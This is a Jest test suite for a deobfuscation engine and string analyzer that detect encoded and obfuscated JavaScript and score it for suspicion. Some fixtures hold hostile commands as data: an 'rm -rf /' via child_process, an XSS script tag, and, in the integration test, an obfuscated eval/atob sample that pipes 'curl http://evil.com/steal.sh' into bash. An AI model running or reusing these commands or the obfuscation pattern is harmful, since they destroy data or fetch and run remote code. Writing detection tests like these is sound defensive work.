import { DeobfuscationEngine, StringAnalyzer } from '../utils/deobfuscation';

describe('DeobfuscationEngine', () => {
  let engine: DeobfuscationEngine;

  beforeEach(() => {
    engine = new DeobfuscationEngine();
  });

  describe('Base64 Detection', () => {
    test('should detect and decode Base64 strings', async () => {
      const content = 'const secret = "aGVsbG8gd29ybGQ="; // hello world in base64';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('base64');
      expect(result.deobfuscatedContent).toContain('hello world');
    });

    test('should handle multiple Base64 strings', async () => {
      const content = `
        const msg1 = "SGVsbG8="; // Hello
        const msg2 = "V29ybGQ="; // World
      `;
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('base64');
      expect(result.deobfuscatedContent).toContain('Hello');
      expect(result.deobfuscatedContent).toContain('World');
    });

    test('should ignore invalid Base64', async () => {
      const content = 'const notBase64 = "this-is-not-base64-content";';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).not.toContain('base64');
      expect(result.deobfuscatedContent).toBe(content);
    });

    test('should detect suspicious Base64 content', async () => {
      const suspiciousCode = 'eval("console.log(\'malicious\')");';
      const base64Encoded = Buffer.from(suspiciousCode).toString('base64');
      const content = `const code = "${base64Encoded}";`;
      
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('base64');
      expect(result.suspiciousStrings.length).toBeGreaterThan(0);
      expect(result.suspiciousStrings[0]).toContain('eval');
    });
  });

  describe('Hex Detection', () => {
    test('should detect and decode hex strings with 0x prefix', async () => {
      const content = 'const hex = "0x48656c6c6f"; // Hello in hex';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('hex');
      expect(result.deobfuscatedContent).toContain('Hello');
    });

    test('should detect and decode hex strings with \\x format', async () => {
      const content = 'const hex = "\\x48\\x65\\x6c\\x6c\\x6f"; // Hello in hex';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('hex');
      expect(result.deobfuscatedContent).toContain('Hello');
    });

    test('should detect raw hex strings', async () => {
      const content = 'const hex = "48656c6c6f20576f726c64"; // Hello World in hex';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('hex');
      expect(result.deobfuscatedContent).toContain('Hello World');
    });

    test('should ignore short hex sequences', async () => {
      const content = 'const color = "#ff0000"; // CSS color';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).not.toContain('hex');
    });
  });

  describe('Unicode Escape Detection', () => {
    test('should detect and decode Unicode escapes', async () => {
      const content = 'const unicode = "\\u0048\\u0065\\u006c\\u006c\\u006f"; // Hello';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('unicode');
      expect(result.deobfuscatedContent).toContain('Hello');
    });

    test('should handle mixed Unicode and regular text', async () => {
      const content = 'const mixed = "Hello \\u0057\\u006f\\u0072\\u006c\\u0064!"; // Hello World!';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('unicode');
      expect(result.deobfuscatedContent).toContain('Hello World!');
    });
  });

  describe('URL Encoding Detection', () => {
    test('should detect and decode URL encoded strings', async () => {
      const content = 'const url = "%48%65%6c%6c%6f%20%57%6f%72%6c%64"; // Hello World';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('url');
      expect(result.deobfuscatedContent).toContain('Hello World');
    });

    test('should handle URL encoded special characters', async () => {
      const content = 'const encoded = "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E";';
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('url');
      expect(result.deobfuscatedContent).toContain('<script>alert(\'xss\')</script>');
    });
  });

  describe('JavaScript Deobfuscation', () => {
    test('should deobfuscate string concatenation', () => {
      const content = 'const msg = "Hel" + "lo" + " Wor" + "ld";';
      const result = engine.deobfuscateJavaScript(content);

      expect(result).toContain('"Hello World"');
    });

    test('should deobfuscate String.fromCharCode patterns', () => {
      const content = 'const msg = String.fromCharCode(72, 101, 108, 108, 111);';
      const result = engine.deobfuscateJavaScript(content);

      expect(result).toContain('"Hello"');
    });

    test('should deobfuscate eval(atob()) patterns', () => {
      const base64Code = Buffer.from('console.log("test")').toString('base64');
      const content = `eval(atob("${base64Code}"));`;
      const result = engine.deobfuscateJavaScript(content);

      expect(result).toContain('DEOBFUSCATED');
      expect(result).toContain('console.log("test")');
    });

    test('should deobfuscate property access patterns', () => {
      const content = 'window["eval"]("code"); obj["property"];';
      const result = engine.deobfuscateJavaScript(content);

      expect(result).toContain('window.eval');
      expect(result).toContain('obj.property');
    });

    test('should handle complex nested obfuscation', () => {
      const content = `
        const a = "ev" + "al";
        const b = String.fromCharCode(40, 41);
        window[a] + b;
      `;
      const result = engine.deobfuscateJavaScript(content);

      expect(result).toContain('"eval"');
      expect(result).toContain('"()"');
    });
  });

  describe('Entropy Calculation', () => {
    test('should calculate low entropy for repeated characters', () => {
      const entropy = engine.calculateEntropy('aaaaaaaaaa');
      expect(entropy).toBeLessThan(1);
    });

    test('should calculate high entropy for random strings', () => {
      const entropy = engine.calculateEntropy('aB3$kL9@mN7&pQ2!');
      expect(entropy).toBeGreaterThan(3);
    });

    test('should calculate medium entropy for normal text', () => {
      const entropy = engine.calculateEntropy('Hello World! This is a test.');
      expect(entropy).toBeGreaterThan(2);
      expect(entropy).toBeLessThan(5);
    });

    test('should handle empty strings', () => {
      const entropy = engine.calculateEntropy('');
      expect(entropy).toBe(0);
    });
  });

  describe('Comprehensive Deobfuscation', () => {
    test('should handle multiple encoding types in one content', async () => {
      const content = `
        const base64 = "SGVsbG8="; // Hello
        const hex = "0x576f726c64"; // World
        const unicode = "\\u0021"; // !
        const concat = "Te" + "st";
      `;
      
      const result = await engine.deobfuscate(content);

      expect(result.encodingTypes).toContain('base64');
      expect(result.encodingTypes).toContain('hex');
      expect(result.encodingTypes).toContain('unicode');
      expect(result.encodingTypes).toContain('javascript_obfuscation');
      
      expect(result.deobfuscatedContent).toContain('Hello');
      expect(result.deobfuscatedContent).toContain('World');
      expect(result.deobfuscatedContent).toContain('!');
      expect(result.deobfuscatedContent).toContain('"Test"');
    });

    test('should detect suspicious patterns in deobfuscated content', async () => {
      const maliciousCode = 'eval(require("child_process").exec("rm -rf /"));';
      const base64Encoded = Buffer.from(maliciousCode).toString('base64');
      const content = `const payload = "${base64Encoded}";`;
      
      const result = await engine.deobfuscate(content);

      expect(result.suspiciousStrings.length).toBeGreaterThan(0);
      expect(result.suspiciousStrings[0]).toContain('eval');
      expect(result.suspiciousStrings[0]).toContain('child_process');
      expect(result.confidence).toBeGreaterThan(0.7);
    });

    test('should provide appropriate confidence scores', async () => {
      // High confidence case: multiple encodings + suspicious content
      const suspiciousContent = `
        const cmd = "${Buffer.from('eval("malicious")').toString('base64')}";
        const hex = "0x${Buffer.from('exec').toString('hex')}";
      `;
      
      const result1 = await engine.deobfuscate(suspiciousContent);
      expect(result1.confidence).toBeGreaterThan(0.8);

      // Low confidence case: normal content
      const normalContent = 'const message = "Hello, World!";';
      const result2 = await engine.deobfuscate(normalContent);
      expect(result2.confidence).toBeLessThan(0.3);
    });
  });
});

describe('StringAnalyzer', () => {
  describe('analyzeString', () => {
    test('should analyze normal strings with low obfuscation score', () => {
      const result = StringAnalyzer.analyzeString('Hello, World! This is a normal string.');
      
      expect(result.entropy).toBeGreaterThan(2);
      expect(result.entropy).toBeLessThan(5);
      expect(result.hasEncodedContent).toBe(false);
      expect(result.suspiciousPatterns).toHaveLength(0);
      expect(result.obfuscationScore).toBeLessThan(0.3);
    });

    test('should detect suspicious patterns', () => {
      const suspiciousCode = `
        eval("malicious code");
        require("child_process").exec("rm -rf /");
        process.env.SECRET_KEY;
      `;
      
      const result = StringAnalyzer.analyzeString(suspiciousCode);
      
      expect(result.suspiciousPatterns).toContain('eval_usage');
      expect(result.suspiciousPatterns).toContain('dynamic_require');
      expect(result.obfuscationScore).toBeGreaterThan(0.3);
    });

    test('should detect encoded content', () => {
      const encodedContent = `
        const secret = "SGVsbG8gV29ybGQ="; // Base64
        const hex = "0x48656c6c6f"; // Hex
      `;
      
      const result = StringAnalyzer.analyzeString(encodedContent);
      
      expect(result.hasEncodedContent).toBe(true);
      expect(result.obfuscationScore).toBeGreaterThan(0.3);
    });

    test('should handle high entropy strings', () => {
      const highEntropyString = 'aB3$kL9@mN7&pQ2!xY8%vC5^wE1*zF4+';
      const result = StringAnalyzer.analyzeString(highEntropyString);
      
      expect(result.entropy).toBeGreaterThan(4);
      expect(result.obfuscationScore).toBeGreaterThan(0.4);
    });

    test('should analyze very long strings as potentially obfuscated', () => {
      const longString = 'a'.repeat(2000);
      const result = StringAnalyzer.analyzeString(longString);
      
      expect(result.obfuscationScore).toBeGreaterThan(0.1);
    });
  });

  describe('extractStringLiterals', () => {
    test('should extract double-quoted strings', () => {
      const code = 'const msg = "Hello World"; const other = "Another string";';
      const strings = StringAnalyzer.extractStringLiterals(code);
      
      expect(strings).toContain('Hello World');
      expect(strings).toContain('Another string');
    });

    test('should extract single-quoted strings', () => {
      const code = "const msg = 'Hello World'; const other = 'Another string';";
      const strings = StringAnalyzer.extractStringLiterals(code);
      
      expect(strings).toContain('Hello World');
      expect(strings).toContain('Another string');
    });

    test('should extract template literals', () => {
      const code = 'const msg = `Hello ${name}`; const other = `Another template`;';
      const strings = StringAnalyzer.extractStringLiterals(code);
      
      expect(strings).toContain('Hello ${name}');
      expect(strings).toContain('Another template');
    });

    test('should handle escaped quotes', () => {
      const code = 'const msg = "He said \\"Hello\\""; const path = "C:\\\\Users\\\\test";';
      const strings = StringAnalyzer.extractStringLiterals(code);
      
      expect(strings).toContain('He said \\"Hello\\"');
      expect(strings).toContain('C:\\\\Users\\\\test');
    });

    test('should ignore short strings', () => {
      const code = 'const a = "Hi"; const b = "Hello World";';
      const strings = StringAnalyzer.extractStringLiterals(code);
      
      expect(strings).not.toContain('Hi');
      expect(strings).toContain('Hello World');
    });

    test('should handle complex JavaScript with multiple string types', () => {
      const code = `
        const msg1 = "Double quoted string";
        const msg2 = 'Single quoted string';
        const msg3 = \`Template literal with \${variable}\`;
        const short = "Hi";
        const regex = /pattern/g;
      `;
      
      const strings = StringAnalyzer.extractStringLiterals(code);
      
      expect(strings).toContain('Double quoted string');
      expect(strings).toContain('Single quoted string');
      expect(strings).toContain('Template literal with ${variable}');
      expect(strings).not.toContain('Hi'); // Too short
      expect(strings).not.toContain('pattern'); // Regex, not string
    });
  });
});

describe('Integration Tests', () => {
  test('should handle real-world obfuscated malware sample', async () => {
    const engine = new DeobfuscationEngine();
    
    // Simulate a real obfuscated malware pattern
    const maliciousCode = 'require("child_process").exec("curl http://evil.com/steal.sh | bash")';
    const obfuscatedSample = `
      const _0x1234 = "${Buffer.from(maliciousCode).toString('base64')}";
      const _0x5678 = "0x${Buffer.from('eval').toString('hex')}";
      const _0x9abc = "\\u0061\\u0074\\u006f\\u0062"; // atob
      window[String.fromCharCode(101,118,97,108)](
        window[_0x9abc](_0x1234)
      );
    `;
    
    const result = await engine.deobfuscate(obfuscatedSample);
    
    // Should detect multiple encoding types
    expect(result.encodingTypes.length).toBeGreaterThan(2);
    expect(result.encodingTypes).toContain('base64');
    expect(result.encodingTypes).toContain('hex');
    expect(result.encodingTypes).toContain('unicode');
    expect(result.encodingTypes).toContain('javascript_obfuscation');
    
    // Should detect suspicious content
    expect(result.suspiciousStrings.length).toBeGreaterThan(0);
    expect(result.suspiciousStrings.some(s => s.includes('child_process'))).toBe(true);
    
    // Should have high confidence
    expect(result.confidence).toBeGreaterThan(0.8);
    
    // Should deobfuscate the malicious code
    expect(result.deobfuscatedContent).toContain('child_process');
    expect(result.deobfuscatedContent).toContain('curl');
    expect(result.deobfuscatedContent).toContain('"eval"');
    expect(result.deobfuscatedContent).toContain('"atob"');
  });

  test('should handle benign encoded content without false positives', async () => {
    const engine = new DeobfuscationEngine();
    
    // Legitimate use of encoding (e.g., for data transmission)
    const legitimateCode = `
      const config = "${Buffer.from('{"api_url": "https://api.example.com", "timeout": 5000}').toString('base64')}";
      const decoded = JSON.parse(atob(config));
      console.log("Connecting to:", decoded.api_url);
    `;
    
    const result = await engine.deobfuscate(legitimateCode);
    
    // Should detect encoding but not be overly suspicious
    expect(result.encodingTypes).toContain('base64');
    expect(result.confidence).toBeLessThan(0.7); // Not too high for legitimate use
    
    // Should not flag legitimate JSON config as highly suspicious
    expect(result.suspiciousStrings.length).toBe(0);
  });
});